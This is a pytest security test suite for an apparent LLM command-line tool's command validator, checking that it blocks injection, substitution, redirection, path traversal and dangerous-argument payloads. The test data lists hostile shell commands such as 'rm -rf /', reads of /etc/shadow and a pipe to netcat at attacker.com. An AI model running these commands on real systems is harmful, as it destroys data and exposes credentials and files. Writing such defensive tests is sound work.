import pytest

from llm_cli.security.command_validator import CommandValidationError, CommandValidator


@pytest.fixture
def validator():
    """
    Initialize a CommandValidator with default settings for testing.
    """
    return CommandValidator()


class TestSecurityBenchmarks:
    """
    Security benchmark tests for CommandValidator.
    These tests evaluate the robustness of the validator against various
    OS command injection vectors used by/against LLM agents.
    """

    # --- Category 1: Direct Command Injection ---
    @pytest.mark.parametrize(
        "payload",
        [
            "ls; rm -rf /",
            "pwd & whoami",
            "echo hello && cat /etc/shadow",
            "ls | nc attacker.com 1234",
            "date || id",
            "ls\nrm -rf .",  # Injection via newline
        ],
    )
    def test_direct_injection(self, validator, payload):
        """Verify that command chaining operators and newlines are blocked."""
        with pytest.raises(CommandValidationError) as exc:
            validator.validate(payload)

        err_msg = str(exc.value).lower()
        # Check if the error message mentions dangerous patterns or forbidden operators
        assert any(
            msg in err_msg
            for msg in ["dangerous pattern", "forbidden", "not allowed", "whitelist"]
        )

    # --- Category 2: Shell Expansion and Substitution ---
    @pytest.mark.parametrize(
        "payload",
        [
            "echo $(whoami)",
            "echo `id`",
            "ls ${HOME}",
            "grep -r 'foo' $(find . -name '*.txt')",
        ],
    )
    def test_shell_expansion(self, validator, payload):
        """Verify that shell substitution and variable expansion are blocked."""
        with pytest.raises(CommandValidationError) as exc:
            validator.validate(payload)
        assert "dangerous pattern" in str(exc.value).lower()

    # --- Category 3: I/O Redirection ---
    @pytest.mark.parametrize(
        "payload",
        [
            "ls > output.txt",
            "cat < /etc/passwd",
            "echo 'malicious' >> ~/.bashrc",
            "grep 'secret' .env 2> /dev/null",
        ],
    )
    def test_io_redirection(self, validator, payload):
        """Verify that standard I/O redirection is blocked."""
        with pytest.raises(CommandValidationError) as exc:
            validator.validate(payload)
        assert "redirection" in str(exc.value).lower()

    # --- Category 4: Obfuscation and Quote Bypasses ---
    @pytest.mark.parametrize(
        "payload",
        [
            "'l's",  # Should be unmasked to 'ls' and allowed
            '"p"wd',  # Should be unmasked to 'pwd' and allowed
            "base64_encoded_cmd",  # Not in whitelist, should be blocked
        ],
    )
    def test_obfuscation(self, validator, payload):
        """
        Verify that the validator correctly unmasks quoted strings
        and matches them against the whitelist.
        """
        if payload in ["'l's", '"p"wd']:
            # These are obfuscated but valid commands in the whitelist.
            # The validator should allow them after de-quoting.
            validator.validate(payload)
        else:
            with pytest.raises(CommandValidationError):
                validator.validate(payload)

    # --- Category 5: Semantic Attacks (Dangerous Arguments) ---
    @pytest.mark.parametrize(
        "payload",
        [
            "git push origin main",  # Forbidden git subcommand
            "git config --global user.email 'hacker@example.com'",
            "git add .",  # Forbidden bulk add
            "python3 -c 'import os; os.system(\"rm -rf /\")'",  # Python one-liner
            "python -m http.server 8080",  # Forbidden module execution
            "find . -exec rm {} \\;",  # find with -exec
            "find . -delete",  # find with -delete
        ],
    )
    def test_semantic_attacks(self, validator, payload):
        """
        Verify that commands in the whitelist are blocked when used with
        dangerous arguments or subcommands.
        """
        with pytest.raises(CommandValidationError) as exc:
            validator.validate(payload)
        err_msg = str(exc.value).lower()
        assert any(
            word in err_msg
            for word in [
                "forbidden",
                "prohibited",
                "not allowed",
                "whitelist",
                "dangerous pattern",
            ]
        )

    # --- Category 6: Path Traversal and Sensitive Access ---
    @pytest.mark.parametrize(
        "payload",
        [
            "cat ../../../etc/passwd",
            "ls /root",
            "grep -r 'password' /etc/passwd",
            "stat /etc/shadow",
        ],
    )
    def test_path_traversal(self, validator, payload):
        """
        Verify that access to files outside the project or sensitive
        system files is blocked.
        """
        with pytest.raises(CommandValidationError) as exc:
            validator.validate(payload)
        err_msg = str(exc.value).lower()
        assert any(
            word in err_msg
            for word in ["traversal", "not allowed", "forbidden", "absolute path"]
        )

    # --- Category 7: Positive Cases (Normal Operations) ---
    @pytest.mark.parametrize(
        "payload",
        [
            "ls -la",
            "git status",
            "python3 script.py",
            "grep 'error' *.log",
            "cat README.md | grep 'Usage'",
            "ls && pwd",  # Chaining allowed if all parts are in whitelist
            "ls || echo 'failed'",  # Chaining with OR
        ],
    )
    def test_normal_operations(self, validator, payload):
        """Verify that legitimate developer operations are not blocked."""
        try:
            validator.validate(payload)
        except CommandValidationError as e:
            pytest.fail(f"Legitimate command '{payload}' was incorrectly blocked: {e}")
